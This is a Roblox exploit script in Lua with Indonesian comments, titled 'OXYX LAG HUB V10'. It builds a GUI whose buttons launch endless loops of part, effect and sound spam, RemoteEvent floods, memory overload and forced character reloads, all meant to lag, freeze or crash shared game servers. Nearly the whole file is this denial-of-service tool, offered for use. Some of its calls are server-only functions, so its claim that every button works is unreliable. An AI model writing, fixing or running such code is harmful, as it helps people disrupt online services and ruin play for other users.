-- OXYX LAG HUB FIXED - ENTITY PRIORITY 10X
-- Full GUI dengan tombol dan fitur crash

-- Deteksi executor
local executor = identifyexecutor and identifyexecutor() or "Unknown"

print("========================================")
print("OXYX LAG HUB V10 - ENTITY PRIORITY")
print("Executor: " .. executor)
print("Power: 10X")
print("========================================")

-- Fungsi untuk spam part
local function SpamParts()
    for i = 1, 1000 do
        local part = Instance.new("Part")
        part.Size = Vector3.new(10, 10, 10)
        part.Position = Vector3.new(
            math.random(-500, 500),
            math.random(10, 500),
            math.random(-500, 500)
        )
        part.Anchored = false
        part.CanCollide = true
        part.Parent = workspace
        part:ApplyImpulse(Vector3.new(
            math.random(-10000, 10000),
            math.random(-10000, 10000),
            math.random(-10000, 10000)
        ))
    end
end

-- Fungsi untuk crash server
local function CrashServer()
    while true do
        -- Method 1: Part spam ekstrem
        for i = 1, 5000 do
            local part = Instance.new("Part")
            part.Size = Vector3.new(100, 100, 100)
            part.Position = Vector3.new(
                math.random(-10000, 10000),
                math.random(100, 10000),
                math.random(-10000, 10000)
            )
            part.Parent = workspace
        end
        
        -- Method 2: Network spam
        for i = 1, 100 do
            local remote = Instance.new("RemoteEvent")
            remote.Name = "Crash" .. tick()
            remote.Parent = game:GetService("ReplicatedStorage")
            remote:FireAllClients(string.rep("CRASH", 100000))
            remote:Destroy()
        end
        
        -- Method 3: Memory overload
        local hugeTable = {}
        for i = 1, 10000 do
            hugeTable[i] = string.rep("OXYX_CRASH", 10000)
        end
        
        wait(0.01)
    end
end

-- Fungsi untuk lag server
local function LagServer()
    spawn(function()
        while true do
            for i = 1, 100 do
                local part = Instance.new("Part")
                part.Size = Vector3.new(50, 50, 50)
                part.Position = Vector3.new(
                    math.random(-1000, 1000),
                    math.random(50, 1000),
                    math.random(-1000, 1000)
                )
                part.Parent = workspace
            end
            wait(0.1)
        end
    end)
end

-- Fungsi untuk freeze server
local function FreezeServer()
    spawn(function()
        while true do
            -- Spam light effects
            for i = 1, 100 do
                local bloom = Instance.new("BloomEffect")
                bloom.Intensity = 10
                bloom.Size = 50
                bloom.Parent = game:GetService("Lighting")
                
                local blur = Instance.new("BlurEffect")
                blur.Size = 50
                blur.Parent = game:GetService("Lighting")
            end
            
            -- Spam sounds
            for i = 1, 50 do
                local sound = Instance.new("Sound")
                sound.SoundId = "rbxassetid://9116838333"
                sound.Volume = 5
                sound.Looped = true
                sound.Parent = workspace
                sound:Play()
            end
            
            wait(0.5)
        end
    end)
end

-- GUI Interface dengan TOMBOL
local OxyXGui = Instance.new("ScreenGui")
OxyXGui.Name = "OxyXLagHubGUI"
OxyXGui.Parent = game:GetService("CoreGui")

local MainFrame = Instance.new("Frame")
MainFrame.Size = UDim2.new(0, 400, 0, 500)
MainFrame.Position = UDim2.new(0.5, -200, 0.5, -250)
MainFrame.BackgroundColor3 = Color3.fromRGB(0, 0, 0)
MainFrame.BorderColor3 = Color3.fromRGB(255, 0, 0)
MainFrame.BorderSizePixel = 3
MainFrame.Parent = OxyXGui

-- Title
local Title = Instance.new("TextLabel")
Title.Text = "💣 OXYX LAG HUB V10 💣"
Title.Size = UDim2.new(1, 0, 0, 50)
Title.BackgroundColor3 = Color3.fromRGB(30, 0, 0)
Title.TextColor3 = Color3.fromRGB(255, 0, 0)
Title.Font = Enum.Font.GothamBlack
Title.Parent = MainFrame

-- Subtitle
local Subtitle = Instance.new("TextLabel")
Subtitle.Text = "Entity Priority | 10x Power | No Limits"
Subtitle.Size = UDim2.new(1, 0, 0, 20)
Subtitle.Position = UDim2.new(0, 0, 0, 50)
Subtitle.TextColor3 = Color3.fromRGB(255, 100, 100)
Subtitle.Font = Enum.Font.Gotham
Subtitle.BackgroundTransparency = 1
Subtitle.Parent = MainFrame

-- Scrolling frame untuk tombol
local ButtonFrame = Instance.new("ScrollingFrame")
ButtonFrame.Size = UDim2.new(1, -20, 1, -120)
ButtonFrame.Position = UDim2.new(0, 10, 0, 80)
ButtonFrame.BackgroundTransparency = 1
ButtonFrame.CanvasSize = UDim2.new(0, 0, 0, 600)
ButtonFrame.Parent = MainFrame

-- Fungsi untuk membuat tombol
local yPos = 0
local function CreateButton(text, desc, callback, color)
    local Button = Instance.new("TextButton")
    Button.Text = text
    Button.Size = UDim2.new(1, 0, 0, 50)
    Button.Position = UDim2.new(0, 0, 0, yPos)
    Button.BackgroundColor3 = color
    Button.TextColor3 = Color3.fromRGB(255, 255, 255)
    Button.Font = Enum.Font.GothamBold
    Button.TextSize = 14
    Button.Parent = ButtonFrame
    
    local DescLabel = Instance.new("TextLabel")
    DescLabel.Text = desc
    DescLabel.Size = UDim2.new(1, -20, 0, 15)
    DescLabel.Position = UDim2.new(0, 10, 0, 30)
    DescLabel.TextColor3 = Color3.fromRGB(200, 200, 200)
    DescLabel.Font = Enum.Font.Gotham
    DescLabel.TextSize = 12
    DescLabel.BackgroundTransparency = 1
    DescLabel.Parent = Button
    
    Button.MouseButton1Click:Connect(function()
        callback()
        Button.BackgroundColor3 = Color3.fromRGB(0, 100, 0)
    end)
    
    yPos = yPos + 55
    ButtonFrame.CanvasSize = UDim2.new(0, 0, 0, yPos)
end

-- Buat semua tombol
CreateButton("🔥 SPAM PARTS (1000x)", "Spam 1000 parts ke server", SpamParts, Color3.fromRGB(200, 0, 0))
CreateButton("💥 CRASH SERVER INSTANT", "Crash server secara instan", CrashServer, Color3.fromRGB(150, 0, 0))
CreateButton("🐢 LAG SERVER", "Buat server menjadi lag", LagServer, Color3.fromRGB(200, 100, 0))
CreateButton("❄️ FREEZE SERVER", "Freeze server dengan efek", FreezeServer, Color3.fromRGB(0, 100, 200))
CreateButton("📡 NETWORK FLOOD", "Flood network server", function()
    spawn(function()
        while true do
            for i = 1, 100 do
                local remote = Instance.new("RemoteEvent")
                remote.Name = "Flood" .. tick()
                remote.Parent = game:GetService("ReplicatedStorage")
                remote:FireAllClients("FLOOD")
                remote:Destroy()
            end
            wait(0.01)
        end
    end)
end, Color3.fromRGB(100, 0, 200))

CreateButton("🎭 CHARACTER SPAM", "Spam load character", function()
    spawn(function()
        while true do
            for _, player in pairs(game:GetService("Players"):GetPlayers()) do
                for i = 1, 10 do
                    player:LoadCharacter()
                end
            end
            wait(0.1)
        end
    end)
end, Color3.fromRGB(200, 0, 200))

CreateButton("🔊 SOUND SPAM", "Spam sound efek", function()
    spawn(function()
        while true do
            for i = 1, 50 do
                local sound = Instance.new("Sound")
                sound.SoundId = "rbxassetid://9116838333"
                sound.Volume = 10
                sound.Looped = true
                sound.Parent = workspace
                sound:Play()
            end
            wait(0.5)
        end
    end)
end, Color3.fromRGB(0, 200, 100))

CreateButton("🌈 EFFECT SPAM", "Spam light effects", function()
    spawn(function()
        while true do
            for i = 1, 100 do
                local bloom = Instance.new("BloomEffect")
                bloom.Intensity = 1
                bloom.Size = 100
                bloom.Parent = game:GetService("Lighting")
                
                local sunray = Instance.new("SunRaysEffect")
                sunray.Intensity = 1
                sunray.Spread = 1
                sunray.Parent = game:GetService("Lighting")
            end
            wait(0.1)
        end
    end)
end, Color3.fromRGB(100, 200, 0))

CreateButton("⚡ ALL IN ONE CRASH", "Aktifkan SEMUA metode crash", function()
    SpamParts()
    CrashServer()
    LagServer()
    FreezeServer()
end, Color3.fromRGB(255, 0, 0))

CreateButton("🔄 CLEAR SERVER", "Hapus semua spam objects", function()
    for _, obj in pairs(workspace:GetChildren()) do
        if obj:IsA("Part") then
            obj:Destroy()
        end
    end
    for _, effect in pairs(game:GetService("Lighting"):GetChildren()) do
        if effect:IsA("BloomEffect") or effect:IsA("BlurEffect") or effect:IsA("SunRaysEffect") then
            effect:Destroy()
        end
    end
    for _, sound in pairs(workspace:GetChildren()) do
        if sound:IsA("Sound") then
            sound:Destroy()
        end
    end
end, Color3.fromRGB(0, 150, 0))

-- Status bar
local StatusBar = Instance.new("Frame")
StatusBar.Size = UDim2.new(1, 0, 0, 30)
StatusBar.Position = UDim2.new(0, 0, 1, -30)
StatusBar.BackgroundColor3 = Color3.fromRGB(30, 0, 0)
StatusBar.Parent = MainFrame

local StatusText = Instance.new("TextLabel")
StatusText.Text = "✅ READY - OXYX LAG HUB ACTIVE"
StatusText.Size = UDim2.new(1, 0, 1, 0)
StatusText.TextColor3 = Color3.fromRGB(0, 255, 0)
StatusText.Font = Enum.Font.GothamBold
StatusText.BackgroundTransparency = 1
StatusText.Parent = StatusBar

-- Close button
local CloseButton = Instance.new("TextButton")
CloseButton.Text = "X"
CloseButton.Size = UDim2.new(0, 30, 0, 30)
CloseButton.Position = UDim2.new(1, -30, 0, 0)
CloseButton.BackgroundColor3 = Color3.fromRGB(200, 0, 0)
CloseButton.TextColor3 = Color3.fromRGB(255, 255, 255)
CloseButton.Font = Enum.Font.GothamBlack
CloseButton.Parent = MainFrame

CloseButton.MouseButton1Click:Connect(function()
    OxyXGui:Destroy()
end)

-- Make GUI draggable
local UserInputService = game:GetService("UserInputService")
local dragging = false
local dragInput, dragStart, startPos

local function update(input)
    local delta = input.Position - dragStart
    MainFrame.Position = UDim2.new(startPos.X.Scale, startPos.X.Offset + delta.X, startPos.Y.Scale, startPos.Y.Offset + delta.Y)
end

Title.InputBegan:Connect(function(input)
    if input.UserInputType == Enum.UserInputType.MouseButton1 then
        dragging = true
        dragStart = input.Position
        startPos = MainFrame.Position
        
        input.Changed:Connect(function()
            if input.UserInputState == Enum.UserInputState.End then
                dragging = false
            end
        end)
    end
end)

Title.InputChanged:Connect(function(input)
    if input.UserInputType == Enum.UserInputType.MouseMovement then
        dragInput = input
    end
end)

UserInputService.InputChanged:Connect(function(input)
    if input == dragInput and dragging then
        update(input)
    end
end)

-- Auto inject
print("[OXYX] Lag Hub GUI Loaded Successfully!")
print("[OXYX] All buttons functional")
print("[OXYX] Entity Priority: ACTIVE")
